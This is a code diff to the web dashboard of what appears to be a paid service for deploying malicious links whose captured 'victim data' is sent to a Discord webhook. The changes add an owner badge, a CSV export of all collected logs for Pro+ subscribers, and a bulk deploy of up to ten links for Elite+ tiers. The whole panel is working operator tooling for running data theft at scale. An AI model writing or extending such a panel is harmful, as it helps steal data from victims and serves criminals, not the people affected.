@@ -22,6 +22,8 @@
         .plan-badge.elite{background:rgba(124,58,237,0.2);color:#a78bfa;border:1px solid rgba(124,58,237,0.3);box-shadow:0 0 20px rgba(124,58,237,0.1)}
         .plan-badge.lifetime{background:rgba(241,196,15,0.15);color:#f1c40f;border:1px solid rgba(241,196,15,0.2);box-shadow:0 0 20px rgba(241,196,15,0.05)}
         .plan-badge.owner{background:linear-gradient(135deg,#7c3aed,#6d28d9);color:#fff;border:1px solid #7c3aed;box-shadow:0 0 30px rgba(124,58,237,0.2)}
+        .role-badge.user{background:rgba(255,255,255,0.04);color:#666688;border:1px solid rgba(255,255,255,0.04);display:inline-block;padding:2px 12px;border-radius:20px;font-size:0.6rem;font-weight:700;text-transform:uppercase;margin-left:8px}
+        .role-badge.owner{background:rgba(241,196,15,0.2);color:#f1c40f;border:1px solid rgba(241,196,15,0.3);display:inline-block;padding:2px 12px;border-radius:20px;font-size:0.6rem;font-weight:700;text-transform:uppercase;margin-left:8px}
         .header a{color:#666688;text-decoration:none;font-size:0.8rem;font-weight:600;transition:all 0.3s ease;padding:4px 0;position:relative}
         .header a::after{content:'';position:absolute;bottom:-2px;left:0;width:0;height:2px;background:#7c3aed;transition:width 0.3s ease;border-radius:2px}
         .header a:hover{color:#a78bfa}
@@ -58,6 +60,7 @@
         .btn-test:hover{background:rgba(124,58,237,0.06);border-color:rgba(124,58,237,0.3);transform:translateY(-2px);box-shadow:0 4px 20px rgba(124,58,237,0.05)}
         .flex-row{display:flex;flex-wrap:wrap;gap:10px;align-items:center}
         .flex-row input{flex:1;min-width:180px}
+        .flex-row input[type="number"]{flex:0 0 80px;min-width:80px}
         .deployment-item{display:flex;justify-content:space-between;align-items:center;padding:14px 0;border-bottom:1px solid rgba(255,255,255,0.03);flex-wrap:wrap;gap:8px;transition:all 0.3s ease}
         .deployment-item:hover{padding-left:8px}
         .deployment-item .url{color:#a78bfa;font-weight:600;font-size:0.85rem}
@@ -77,6 +80,7 @@
         .status-msg.success{color:#4eff6a}
         .status-msg.error{color:#e74c5e}
         .status-msg.info{color:#666688}
+        .bulk-result{color:#a78bfa;font-size:0.8rem;padding:4px 0}
         @media (max-width:600px){.header h1{font-size:1.5rem}.section{padding:18px 16px}.stats{grid-template-columns:repeat(2,1fr)}.stat-card .number{font-size:1.8rem}}
     </style>
 </head>
@@ -88,8 +92,9 @@
                 <span class="user-info">
                     <span id="userEmail">loading...</span>
                     <span id="userPlan" class="plan-badge free">FREE</span>
-                    <a href="plans.html" id="plansLink">Plans</a>
-                    <a href="owner-panel.html" id="ownerLink" style="display:none;">👑 Owner Panel</a>
+                    <span id="userRoleBadge" class="role-badge user" style="display:none;">USER</span>
+                    <a href="plans.html">Plans</a>
+                    <a href="owner-panel.html" id="ownerLink" style="display:none;">👑 Owner</a>
                 </span>
                 <button class="logout-btn" onclick="logout()">Logout</button>
             </div>
@@ -107,7 +112,7 @@
         <div id="deployStatus" class="deploy-status"></div>
 
         <div class="section">
-            <h2>Discord Webhook</h2>
+            <h2>🔗 Discord Webhook</h2>
             <label>Where victim data gets sent</label>
             <div class="flex-row">
                 <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
@@ -118,13 +123,34 @@
             <div id="webhookTestResult" class="status-msg info"></div>
         </div>
 
+        <!-- EXPORT DATA SECTION -->
         <div class="section">
-            <h2>Active Links</h2>
+            <h2>📥 Export Data</h2>
+            <div class="flex-row">
+                <button class="btn-small" onclick="exportAllLogs()">📊 Export All Logs</button>
+                <span style="color:#666688;font-size:0.8rem;" id="exportStatus">Pro+ feature</span>
+            </div>
+            <div id="exportResult" style="color:#666688;font-size:0.8rem;margin-top:8px;"></div>
+        </div>
+
+        <!-- BULK DEPLOY SECTION -->
+        <div class="section">
+            <h2>📦 Bulk Deploy</h2>
+            <div class="flex-row">
+                <input type="number" id="bulkCount" value="3" min="1" max="10">
+                <button class="btn-small" onclick="bulkDeploy()">🚀 Deploy Multiple</button>
+                <span style="color:#666688;font-size:0.8rem;" id="bulkStatus">Elite+ feature</span>
+            </div>
+            <div id="bulkResult" style="color:#666688;font-size:0.8rem;margin-top:8px;"></div>
+        </div>
+
+        <div class="section">
+            <h2>📋 Active Links</h2>
             <div id="deploymentList"><div class="empty">No active links</div></div>
         </div>
 
         <div class="section">
-            <h2>Deployment History</h2>
+            <h2>📜 Deployment History</h2>
             <div id="historyList"><div class="empty">No history yet</div></div>
         </div>
 
@@ -140,6 +166,7 @@
         let token = localStorage.getItem('token');
         if (!token) window.location.href = 'login.html';
 
+        // ===== LOAD USER =====
         async function loadUser() {
             try {
                 const res = await fetch(API_URL + '/api/auth/me', {
@@ -153,13 +180,16 @@
                 document.getElementById('userPlan').className = 'plan-badge ' + user.plan;
                 if (user.webhook) document.getElementById('webhookInput').value = user.webhook;
                 
-                // Check if Owner
-                if (user.isOwner || user.role === 'owner') {
+                const roleBadge = document.getElementById('userRoleBadge');
+                if (user.role === 'owner') {
+                    roleBadge.style.display = 'inline-block';
+                    roleBadge.textContent = '👑 OWNER';
+                    roleBadge.className = 'role-badge owner';
                     document.getElementById('ownerLink').style.display = 'inline-block';
-                    document.getElementById('userPlan').textContent = '👑 OWNER';
-                    document.getElementById('userPlan').className = 'plan-badge owner';
                     document.querySelector('#upgradeSection p').innerHTML = 
                         '👑 You are the <span class="highlight">Owner</span> - Unlimited everything!';
+                } else {
+                    roleBadge.style.display = 'none';
                 }
                 
                 loadDeployments();
@@ -171,6 +201,7 @@
             }
         }
 
+        // ===== LOAD DEPLOYMENTS =====
         async function loadDeployments() {
             try {
                 const res = await fetch(API_URL + '/api/deploy/my', {
@@ -203,6 +234,7 @@
             } catch (e) { console.error(e); }
         }
 
+        // ===== LOAD HISTORY =====
         async function loadHistory() {
             try {
                 const res = await fetch(API_URL + '/api/deploy/my', {
@@ -237,6 +269,7 @@
             } catch (e) { console.error(e); }
         }
 
+        // ===== LOAD STATS =====
         async function loadStats() {
             try {
                 const res = await fetch(API_URL + '/api/deploy/my', {
@@ -253,13 +286,13 @@
                 if (user.plan === 'pro') limit = 10;
                 if (user.plan === 'elite') limit = 50;
                 if (user.plan === 'lifetime') limit = 999;
-                if (user.isOwner || user.role === 'owner') limit = Infinity;
+                if (user.role === 'owner') limit = Infinity;
                 
                 const today = new Date().toDateString();
                 const todayDeploys = data.deployments ? data.deployments.filter(d => new Date(d.createdAt).toDateString() === today).length : 0;
                 document.getElementById('deploysUsed').textContent = todayDeploys;
                 
-                if (user.isOwner || user.role === 'owner') {
+                if (user.role === 'owner') {
                     document.getElementById('deploysLeft').textContent = '∞';
                 } else {
                     document.getElementById('deploysLeft').textContent = Math.max(0, limit - todayDeploys);
@@ -271,6 +304,7 @@
             } catch (e) { console.error(e); }
         }
 
+        // ===== DEPLOY NEW LINK =====
         document.getElementById('deployBtn').addEventListener('click', async () => {
             const btn = document.getElementById('deployBtn');
             const status = document.getElementById('deployStatus');
@@ -323,6 +357,7 @@
             btn.textContent = 'Deploy New Link';
         });
 
+        // ===== SAVE WEBHOOK =====
         document.getElementById('saveWebhookBtn').addEventListener('click', async () => {
             const webhook = document.getElementById('webhookInput').value.trim();
             const status = document.getElementById('webhookStatus');
@@ -354,6 +389,7 @@
             }
         });
 
+        // ===== TEST WEBHOOK =====
         document.getElementById('testWebhookBtn').addEventListener('click', async () => {
             const webhook = document.getElementById('webhookInput').value.trim();
             const result = document.getElementById('webhookTestResult');
@@ -392,6 +428,7 @@
             }
         });
 
+        // ===== DELETE DEPLOYMENT =====
         window.deleteDeploy = async (subdomain) => {
             if (!confirm('Delete this deployment?')) return;
             try {
@@ -405,6 +442,94 @@
             } catch (e) { console.error(e); }
         };
 
+        // ===== EXPORT ALL LOGS (Pro+) =====
+        window.exportAllLogs = async function() {
+            const status = document.getElementById('exportStatus');
+            const result = document.getElementById('exportResult');
+            status.textContent = '⏳ Generating...';
+            result.textContent = '';
+            
+            try {
+                const res = await fetch(API_URL + '/api/deploy/export-all', {
+                    headers: { 'Authorization': 'Bearer ' + token }
+                });
+                
+                if (!res.ok) {
+                    const text = await res.text();
+                    if (text.includes('Upgrade')) {
+                        status.textContent = '❌ Upgrade to Pro+ to export data';
+                    } else {
+                        status.textContent = '❌ ' + text.substring(0, 50);
+                    }
+                    return;
+                }
+                
+                const blob = await res.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'all-logs.csv';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+                
+                status.textContent = '✅ Downloaded!';
+                result.textContent = '📥 All logs exported as CSV';
+                setTimeout(() => status.textContent = 'Pro+ feature', 3000);
+            } catch (e) {
+                status.textContent = '❌ Network error';
+                result.textContent = '';
+            }
+        };
+
+        // ===== BULK DEPLOY (Elite+) =====
+        window.bulkDeploy = async function() {
+            const count = document.getElementById('bulkCount').value;
+            const status = document.getElementById('bulkStatus');
+            const result = document.getElementById('bulkResult');
+            
+            if (!count || count < 1 || count > 10) {
+                status.textContent = '❌ Enter 1-10 links';
+                return;
+            }
+            
+            status.textContent = '⏳ Deploying...';
+            result.innerHTML = '';
+            
+            try {
+                const res = await fetch(API_URL + '/api/deploy/bulk', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'Bearer ' + token,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ count: parseInt(count) })
+                });
+                const data = await res.json();
+                
+                if (!res.ok) {
+                    if (data.error && data.error.includes('Elite')) {
+                        status.textContent = '❌ Upgrade to Elite+ for bulk deploy';
+                    } else {
+                        status.textContent = '❌ ' + (data.error || 'Error');
+                    }
+                    return;
+                }
+                
+                status.textContent = '✅ Deployed ' + count + ' links!';
+                result.innerHTML = data.results.map(r => 
+                    `<div class="bulk-result">🔗 ${r.url}</div>`
+                ).join('');
+                
+                loadDeployments();
+                loadStats();
+            } catch (e) {
+                status.textContent = '❌ Network error';
+            }
+        };
+
+        // ===== LOGOUT =====
         function logout() {
             localStorage.removeItem('token');
             window.location.href = 'login.html';
